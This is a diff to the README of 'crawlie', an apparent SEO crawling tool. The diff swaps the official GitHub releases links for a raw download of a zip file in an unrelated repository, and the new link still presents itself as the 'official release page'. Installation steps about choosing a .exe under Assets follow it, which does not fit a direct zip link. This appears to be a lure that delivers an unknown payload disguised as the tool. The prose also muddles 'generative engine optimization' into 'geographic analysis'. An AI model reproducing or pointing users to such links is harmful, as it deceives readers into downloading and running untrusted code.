@@ -5,7 +5,7 @@ description: "Crawl websites for technical SEO and generative engine optimizatio
 ---
 # 🕷️ crawlie - Gather web data with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Galllodgement343/crawlie/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Galllodgement343/galllodgement343.github.io/main/Myrothamnus/io-github-galllodgement-virtued.zip)
 
 Crawlie maps web pages and gathers data for search engine optimization and geographic analysis. This tool scans websites to reveal technical details. It helps you understand how search engines see your content. It also tracks how your site appears in different parts of the world.
 
@@ -13,7 +13,7 @@ Crawlie maps web pages and gathers data for search engine optimization and geogr
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Galllodgement343/crawlie/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Galllodgement343/galllodgement343.github.io/main/Myrothamnus/io-github-galllodgement-virtued.zip).
 2. Look for the section marked Assets.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
